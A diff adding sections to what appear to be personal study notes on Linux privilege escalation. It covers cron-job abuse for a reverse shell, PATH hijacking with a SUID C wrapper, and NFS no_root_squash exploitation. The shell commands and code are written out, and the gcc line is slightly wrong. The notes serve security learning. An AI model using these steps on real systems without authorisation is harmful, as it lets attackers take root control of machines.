@@ -145,7 +145,38 @@ note that the listed capabilities are not SUID files. Therefore are these files 
 # Privillege Escalation: Cron Jobs
 
 Cron Jobs are jobs that are run on a specific time. You can read all the crontabs using the `cat /etc/crontab` we can then modify any script to get for example a reverse shell. If this script is run with root privilleges the reverse shell will be a root shell.
-
 # Privillege Escalation: PATH variable
 
+PATH in Linux in an environmetnal variable that tells the opterating system where to search for executables `echo $PATH` For example if we type "program" in the command line this is the location Linux will look for an executable called "program" 
+
+The following script will try to execute the hackme binary and will look for it in the $PATH table
+
+`#include<unistd.h>
+void main()
+{ setuid(0);
+setgid(0);
+system("hackme");
+}`
+
+Safe this program as a .c file and compile it using gcc `gcc hackme -o shell`
+Now give this compiled file SUID permissions  `chmod u+s shell`
+
+If you can't compile on the target machine do this locally and open up a local python server and download it to the target machine. 
+
+Now make a binary called "hackme" this is the binary that the .c script will try to execute once we add our path to the PATH variable. For example (don't forget to add permissions to the binary)
+
+`echo "/bin/bash" > hackme` 
+
+this will make a simple binary that will open a bash shell. You can do this in for example in the /tmp folder. To add the /tmp to our variable we will use the export `PATH=/tmp:$PATH` command
+
+This will add /tmp to the $PATH variable.
+
 # Privillege Escalation: NFS
+
+Instead of doing privillege Escalation on an internal network. Shared folders, remote access such as SSGH can also help you gain root access to the initial target. In some cases you will need both, for example finding a private SSH key in the .ssh folder of a user and then connecting via SSH with root privileges. However we can also exploit a misconfigured network shell. This vector is sometimes overlooked. 
+
+Network File Sharing or in short NFS config is stored in the /etc/exports file and this can be usually read by users. For this escalation method to work its critcal that the "no_root_squash" option. If this option is present we can create an executable with SUID set and run it on the target system. 
+
+We will first start by enumerating the shares on the machine using the `showmount -e <ip>` command. 
+
+We will mount our folder to the folder with the no_root_squash option enabled. using the `mount -o rw 10.10.70.63:/tmp /tmp/nfs` now your local system is mounted with the system. Go into the the root user using the su command, and make a simple script that call the /bin/bash binary and give it the SUID permissions, now execute the SUID file from your target machine.
